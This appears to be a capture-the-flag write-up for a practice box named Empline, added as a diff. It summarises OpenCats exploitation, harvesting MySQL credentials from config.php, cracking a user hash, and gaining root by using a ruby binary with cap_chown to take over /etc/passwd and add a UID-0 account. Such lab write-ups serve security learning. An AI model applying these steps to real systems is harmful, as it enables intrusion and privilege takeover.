@@ -1,0 +1,57 @@
+1. Enumerate empline.thm
+    22/tcp   open  ssh
+    80/tcp   open  http
+    3306/tcp open  mysql
+2. Visit http://empline.thm/
+    Find http://job.empline.thm/careers
+    Add vhost(job) to /etc/hosts and enumerate vhosts to empline.thm
+
+3. Visit http://job.empline.thm/careers
+    CMS: OpenCats
+    Version: 0.9.4
+    Vulnerable: True
+
+4. Exploit CMS OpenCats
+    And I get reverse shell !!! :)
+    
+5. Privilege escalation (user1)
+    Check config.php file
+    I found creds of mysql!
+    ...
+      /* Database configuration. */
+      define('DATABASE_USER', 'james');
+      define('DATABASE_PASS', 'ng6pUFvsGNtw');
+      define('DATABASE_HOST', 'localhost');
+      define('DATABASE_NAME', 'opencats');
+    $ mysql -h localhost -u james -p
+    <Paste password>
+    mysql> use opencats;select * from user;
+    And I found passwd hash of george and crack this on crackstation.net :)
+    Hash: 86d0dfda99dbebc424eb4407947356ac
+    PasswdCracked: pretonnevippasempre
+
+6. Privilege escalation (root)
+    Run linpeas.sh
+    ...
+    Files with capabilities:
+    /usr/bin/mtr-packet = cap_net_raw+ep
+    /usr/local/bin/ruby = cap_chown+ep
+
+    [+] Users with capabilities
+    [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+
+    - Check /usr/bin/mtr-packet
+    No results...
+    - Check /usr/local/bin/ruby
+    george@empline:~$ /usr/local/bin/ruby -e 'file=File.new("/etc/passwd", "r");file.chown(1002, 1002)'
+    Yes... Now I can write to /etc/passwd !!!
+    Add my pevileged user ! :)
+    root@pt-box:~# mkpasswd -m sha-512
+    <HASH>
+    Change /etc/passwd file...
+    ...
+    leo:<HASH>:0:0::/root:/bin/bash
+    george@empline:~$ su leo
+    <Paste password>
+    And I get root !!! :D
+Thanks!
